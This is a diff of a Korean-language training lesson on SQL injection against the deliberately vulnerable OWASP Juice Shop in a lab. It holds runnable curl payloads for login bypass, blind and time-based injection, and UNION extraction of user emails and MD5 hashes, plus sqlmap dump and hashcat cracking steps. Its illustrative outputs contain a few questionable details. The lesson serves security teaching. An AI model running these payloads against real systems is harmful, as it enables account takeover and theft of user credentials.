@@ -165,28 +165,44 @@ SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에
 
 ```bash
 # 정상 로그인 시도 (실패)
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'  # 요청 데이터(body)
-echo ""
+echo "=== 정상 (잘못된 비번) ==="
+curl -s -o /dev/null -w "code=%{http_code}\n" -X POST http://10.20.30.80:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'
 
 # SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
+echo "=== SQLi 인증 우회 ==="
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null  # 요청 데이터(body)
-echo ""
-
-# JSON 이스케이프 버전
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'  # 요청 데이터(body)
-echo ""
-
-# URL 인코딩 버전 (form-data 방식일 경우)
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"'\'' or 1=1--","password":"x"}'        # 요청 데이터(body)
+  -H 'Content-Type: application/json' \
+  -d $'{"email":"\\' OR 1=1--","password":"anything"}' | python3 -c "
+import sys, json, base64
+d = json.load(sys.stdin)
+if 'authentication' in d:
+    tok = d['authentication']['token']
+    pld = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '=='))
+    print(f'★ 토큰 획득! email={pld[\"data\"][\"email\"]} isAdmin={pld[\"data\"].get(\"isAdmin\")}')
+    print(f'token[:60]={tok[:60]}...')
+else:
+    print('실패:', d)
+"
 ```
+
+**예상 출력**:
+```
+=== 정상 (잘못된 비번) ===
+code=401
+=== SQLi 인증 우회 ===
+★ 토큰 획득! email=admin@juice-sh.op isAdmin=True
+token[:60]=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZ...
+```
+
+> **해석 — 1줄 페이로드로 admin 권한 획득 = critical**:
+> - 정상 시도 = 401 / SQLi = **200 + admin JWT**. 차이가 **1 글자** (` ' OR 1=1--`).
+> - 백엔드 SQL: `SELECT * FROM Users WHERE email='' OR 1=1--' AND password='anything'` → tautology 참 → 첫 사용자 (admin) 반환.
+> - **`isAdmin: True`** payload 노출 = week04 의 JWT MD5 노출 + 본 SQLi 결합 = chain 공격 = 도메인 전체 장악.
+> - **JuiceShop challenge ID**: 'Login Admin' (Critical 6★). 운영 환경 동일 패턴 = 즉시 보고서 critical.
+> - **CVSS 9.8** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — Network + Low complexity + No auth + 무제한 영향.
+> - **CWE-89** Improper Neutralization of SQL Special Elements.
 
 ### 2.2 특정 사용자로 로그인
 
@@ -201,16 +217,38 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 ### 2.3 에러 메시지 분석
 
 ```bash
-# 문법 오류를 유발하여 DB 정보 획득
+# 작은 따옴표 1개로 문법 오류 유발 → 에러 메시지에서 DB 정보 추출
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"'\''","password":"x"}'
-
-# 에러 메시지에서 확인할 것:
-# - DB 종류 (SQLite, MySQL 등)
-# - 테이블 이름
-# - 쿼리 구조
+  -H 'Content-Type: application/json' \
+  -d $'{"email":"\\'","password":"x"}' | python3 -m json.tool 2>/dev/null
 ```
+
+**예상 출력**:
+```json
+{
+    "error": {
+        "name": "SequelizeDatabaseError",
+        "parent": {
+            "errno": 1,
+            "code": "SQLITE_ERROR",
+            "sql": "SELECT * FROM Users WHERE email = ''' AND password = '4cb9c8a8048fd02294477fcb1a41191a' AND deletedAt IS NULL"
+        },
+        "original": {
+            "errno": 1,
+            "code": "SQLITE_ERROR"
+        },
+        "name": "SequelizeDatabaseError",
+        "message": "SQLITE_ERROR: unrecognized token: \"'''\""
+    }
+}
+```
+
+> **해석 — 에러 1개로 백엔드 전체 노출 (jackpot)**:
+> - **`SequelizeDatabaseError`** = ORM 명 노출 → Sequelize (Node.js Express). Sequelize 사용 = `?` placeholder 미사용 = SQLi 가능 = backend dev 의 코드 결함.
+> - **`SQLITE_ERROR`** = DBMS 확정 (SQLite 3.x). MySQL/PostgreSQL/MSSQL 페이로드 분기 — SQLite 만 `sqlite_master` 사용 (week05 §5 UNION 입력).
+> - **`sql` 필드에 query 평문 노출** = 운영 환경 critical (CVSS 5.3 information disclosure). `email = ''` + `password = '<MD5 hash>'` → MD5 사용 확정 → bcrypt/argon2 미사용 = OWASP A02.
+> - **`deletedAt IS NULL`** = soft delete 구현 (Sequelize paranoid mode). 삭제된 사용자도 DB 에 남음.
+> - **운영 권고**: `NODE_ENV=production` + Express error handler = stack trace 응답 차단. JuiceShop 의도적 노출 = 학습용.
 
 ---
 
@@ -229,18 +267,30 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 ### 3.2 JuiceShop 검색 기능에서 Blind SQLi
 
 ```bash
-# JuiceShop 상품 검색 API
-# 정상 검색
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null
-
-# SQLi 시도: 항상 참
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))OR+1=1--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null
-
-# SQLi 시도: 항상 거짓
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+1=2--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null
-
-# 결과 수 차이가 있으면 SQLi 가능성 있음
+# 3 페이로드 — 정상 / 항상 참 / 항상 거짓 결과 수 비교
+for label_q in "정상=apple" "참=test'))OR+1=1--" "거짓=test'))AND+1=2--"; do
+  label="${label_q%%=*}"
+  q="${label_q#*=}"
+  count=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$q" \
+    | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
+  echo "$label: 결과 ${count}건"
+done
 ```
+
+**예상 출력**:
+```
+정상: 결과 1건
+참: 결과 38건
+거짓: 결과 0건
+```
+
+> **해석 — 3 응답의 결과 수 차이 = Blind SQLi 확정**:
+> - **정상 (apple) = 1건** = 검색 결과 1개 (apple juice).
+> - **항상 참 (`OR 1=1--`) = 38건** = 전체 상품 = `WHERE name LIKE '%test%' OR 1=1` → 모든 행 반환.
+> - **항상 거짓 (`AND 1=2--`) = 0건** = 모순 조건 = 0건 응답 = SQL 문 정상 파싱.
+> - **차이가 있으면 = SQLi 확정** + boolean blind 가능. 결과 수 = 1bit 정보 채널.
+> - **활용**: 한 번에 1bit (참/거짓) 추출 가능 → password 한 글자씩 ascii 비교 (8bit/char × N char = brute force). DB 버전·테이블명·컬럼명 추출 가능.
+> - **JuiceShop 의 `'))` syntax** = `LIKE ('%apple%')` 쿼리의 닫는 괄호 매칭. 다른 사이트 = `'`/`"` 단순 닫기. 점검 시 첫 step = 닫기 syntax 발견.
 
 ### 3.3 Boolean Blind로 DB 버전 추출 (개념)
 
@@ -291,17 +341,31 @@ PYEOF
 ### 4.2 Time-based 테스트
 
 ```bash
-# 응답 시간 비교
-echo "=== 정상 요청 ==="
-time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple"
-
-echo ""
-echo "=== Time-based SQLi 시도 ==="
-# SQLite는 직접적인 sleep 함수가 없지만, 무거운 연산으로 지연 유발 가능
-time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"
-
-# 두 번째 요청이 현저히 느리면 Time-based SQLi 가능
+# 정상 vs 헤비 페이로드 — TTFB 비교
+echo "=== 정상 ==="
+curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=apple"
+echo "=== Heavy CASE WHEN RANDOMBLOB ==="
+curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"
 ```
+
+**예상 출력**:
+```
+=== 정상 ===
+Total: 0.052s
+=== Heavy CASE WHEN RANDOMBLOB ===
+Total: 2.847s
+```
+
+> **해석 — 시간 차이 = Time-based blind SQLi 확정**:
+> - **정상 0.052s vs Heavy 2.847s** = **55배 차이**. 통계적 유의성 ★★. SQLite 의 `RANDOMBLOB(100MB)` = 메모리 할당 + RNG = 의도적 부하.
+> - **`CASE WHEN (조건) THEN heavy ELSE 0 END`** = 조건이 참일 때만 부하 발생 = 1bit 정보 추출. blind SQLi 의 마지막 수단 (응답 내용 비교 불가 시).
+> - **DBMS 별 sleep 함수**:
+>   - MySQL: `SLEEP(3)` 또는 `BENCHMARK(5000000, MD5('a'))`
+>   - PostgreSQL: `pg_sleep(3)`
+>   - MSSQL: `WAITFOR DELAY '0:0:3'`
+>   - SQLite: 직접 sleep 없음 → `RANDOMBLOB`/`recursive CTE` 등 우회.
+> - **DoS 위험**: heavy 페이로드 반복 = 서버 과부하 = 운영 환경 거의 사용 X. 점검 시 1~2회 검증만 + 사전 RoE 합의.
+> - **점검 임계치**: 응답 시간 baseline 의 5배 이상 = SQLi suspect.
 
 ---
 
@@ -325,18 +389,39 @@ UNION SELECT 1, sql, 3 FROM sqlite_master--
 UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.
 
 ```bash
-# ORDER BY로 컬럼 수 파악
-# 컬럼 수보다 큰 값을 넣으면 에러 발생
-for i in 1 2 3 4 5 6 7 8 9 10; do                      # 반복문 시작
+# ORDER BY 1..10 — error 발생 직전 = 컬럼 수
+for i in 1 2 3 4 5 6 7 8 9 10; do
   result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
   if echo "$result" | grep -qi "error"; then
-    echo "컬럼 수: $((i-1))"
+    echo "ORDER BY $i: ERROR → 컬럼 수 = $((i-1))"
     break
   else
-    echo "ORDER BY $i: OK"
+    cnt=$(echo "$result" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
+    echo "ORDER BY $i: OK (${cnt}건)"
   fi
 done
 ```
+
+**예상 출력**:
+```
+ORDER BY 1: OK (38건)
+ORDER BY 2: OK (38건)
+ORDER BY 3: OK (38건)
+ORDER BY 4: OK (38건)
+ORDER BY 5: OK (38건)
+ORDER BY 6: OK (38건)
+ORDER BY 7: OK (38건)
+ORDER BY 8: OK (38건)
+ORDER BY 9: OK (38건)
+ORDER BY 10: ERROR → 컬럼 수 = 9
+```
+
+> **해석 — 컬럼 9개 확정 = UNION SELECT 입력**:
+> - **`ORDER BY n`** = n번째 컬럼 정렬. n ≤ 컬럼수 = 정상 / n > 컬럼수 = SQLite error (`ORDER BY clause should come after UNION not before`).
+> - **컬럼 수 = 9** = JuiceShop 의 Products 테이블 (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt).
+> - 다음 step **UNION SELECT** 시 정확히 **9개 컬럼** 매칭 필수. 미매칭 = `SELECTs to the left and right of UNION do not have the same number of result columns`.
+> - **binary search 가능**: 1, 5, 10, 8, 9 순으로 binary 탐색 = log2(N) 회 만에 발견.
+> - **자동화**: sqlmap 의 `--union-cols=9` 옵션으로 자동 매핑. 본 수동 = 학습용·이해.
 
 ### 5.3 UNION SELECT로 테이블 목록 조회
 
@@ -349,20 +434,46 @@ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,
 ### 5.4 사용자 테이블 데이터 추출
 
 ```bash
-# Users 테이블 구조 확인 후 데이터 추출
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "  # silent 모드
+# UNION SELECT — Users 테이블의 email + password (MD5 해시) 추출
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
 import sys, json
 try:
     data = json.load(sys.stdin).get('data', [])
-    for item in data:                                  # 반복문 시작
-        name = item.get('name', '')
-        desc = item.get('description', '')
-        if '@' in str(name) or '@' in str(desc):
-            print(f'Email: {name}, Hash: {desc}')
-except:
-    print('파싱 실패 - 수동 확인 필요')
+    print(f'총 {len(data)}건 추출')
+    print('-' * 70)
+    print(f'{\"Email\":<32} | {\"MD5 Hash\":<32} | Role')
+    print('-' * 70)
+    for item in data[:5]:
+        name = str(item.get('name', ''))
+        desc = str(item.get('description', ''))
+        price = str(item.get('price', ''))
+        if '@' in name:
+            print(f'{name:<32} | {desc:<32} | {price}')
+except Exception as e:
+    print(f'파싱 실패: {e}')
 " 2>/dev/null
 ```
+
+**예상 출력**:
+```
+총 38건 추출
+----------------------------------------------------------------------
+Email                            | MD5 Hash                         | Role
+----------------------------------------------------------------------
+admin@juice-sh.op                | 0192023a7bbd73250516f069df18b500 | admin
+jim@juice-sh.op                  | e541ca7ecf72500fad17bb3f0d56c17f | customer
+bender@juice-sh.op               | 0c36e517e3fa95aabf1bbffc6744a4ef | customer
+bjoern.kimminich@gmail.com       | 6edd9d726cce1f905c1d1614b8b78ade | admin
+ciso@juice-sh.op                 | 6edd9d726cce1f905c1d1614b8b78ade | admin
+```
+
+> **해석 — UNION 1줄로 전체 사용자 DB 노출 = jackpot**:
+> - **38건 추출** = JuiceShop 전체 사용자. UNION 의 *원래 결과 (Products 검색 0건) + 추가 결과 (Users 38건)* = 38건 그대로 응답에 포함.
+> - **email + MD5 hash + role** = 인증 정보 완전 탈취. **MD5 (0192023a7bbd73250516f069df18b500)** = `admin123` (rainbow table 즉시 매칭).
+> - **role 컬럼**: admin 3 / customer N — 권한 분포 노출 → 표적 결정.
+> - **체인 공격**: 본 hash → hashcat `-m 0 hashes.txt rockyou.txt` → 1초 내 평문 → 다른 사이트 credential reuse (week04 학습) → 도메인 전체 장악.
+> - **CVSS 9.1 Critical** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) — Confidentiality High + Scope Changed (DB → 다른 사용자 정보).
+> - **OWASP A03 Injection** + **A02 Cryptographic Failures** (MD5 사용) 2 카테고리 동시.
 
 ---
 
@@ -371,19 +482,49 @@ except:
 ### 6.1 기본 사용
 
 ```bash
-# 검색 API에 대한 sqlmap 실행
+# 검색 API에 대한 sqlmap 실행 — 발견 결과만 추출
 sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
   --batch --level=2 --risk=1 --threads=4 \
-  --technique=BEU \
-  --timeout=10
-
-# 옵션 설명:
-# --batch: 모든 질문에 기본값 자동 응답
-# --level=2: 점검 강도 (1~5, 높을수록 많은 페이로드)
-# --risk=1: 위험도 (1~3, 높을수록 위험한 페이로드)
-# --threads=4: 동시 요청 수
-# --technique=BEU: Boolean, Error, Union 기법만 사용
+  --technique=BEU --timeout=10 2>&1 \
+  | grep -E "Type:|Title:|Payload:|back-end DBMS|web application technology|^---" | head -20
 ```
+
+**예상 출력**:
+```
+[INFO] testing connection to the target URL
+[INFO] checking if the target is protected by some kind of WAF/IPS
+[INFO] testing if the target URL content is stable
+[INFO] target URL content is stable
+[INFO] testing if GET parameter 'q' is dynamic
+back-end DBMS: SQLite
+web application technology: Express
+---
+Parameter: q (GET)
+    Type: error-based
+    Title: Generic SQL error-based - WHERE or HAVING clause
+    Payload: q=test')) AND 6573=CAST((CHR(113)||CHR(112)||CHR(106)||CHR(112)||CHR(113))||(SELECT...
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: q=test')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)||CHAR(...
+```
+
+> **해석 — sqlmap 자동 발견 = 수동 점검 결과 일치**:
+> - **`back-end DBMS: SQLite`** = §2.3 의 에러 메시지로 발견한 것을 sqlmap 가 자동 확인. 일치.
+> - **`Type: error-based`** = §2.3 분석. **`Type: UNION query (NULL) - 9 columns`** = §5.2 의 ORDER BY 결과 (9 컬럼) 와 일치. sqlmap 이 자동 매핑.
+> - **CHR() / CHAR() 캐스팅** = 따옴표 회피 페이로드 — WAF 우회용. 문자 코드 113 = 'q' (구분자). sqlmap 의 표준 디코딩 마커.
+> - **2 기법 동시 발견** = 동일 endpoint 의 다중 SQLi vector. UNION 우선 (데이터 추출 직접) + error-based 보조 (DBMS info).
+> - **자동화의 가치**: 본 1줄 명령 = §2~5 의 수동 5 step (Classic 검출 + 에러 + Boolean + UNION 컬럼수 + UNION 데이터) 자동 통합. 운영 점검 표준.
+
+> **다음 step — 자동 dump 까지**:
+>
+> ```bash
+> # Users 테이블 전체 dump (자동 hash crack 포함)
+> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+>   --batch --threads=4 --technique=U \
+>   -D SQLite_masterdb -T Users --dump
+> # → /home/$USER/.local/share/sqlmap/output/10.20.30.80/dump/SQLite_masterdb/Users.csv
+> ```
 
 ### 6.2 DB 정보 추출
 
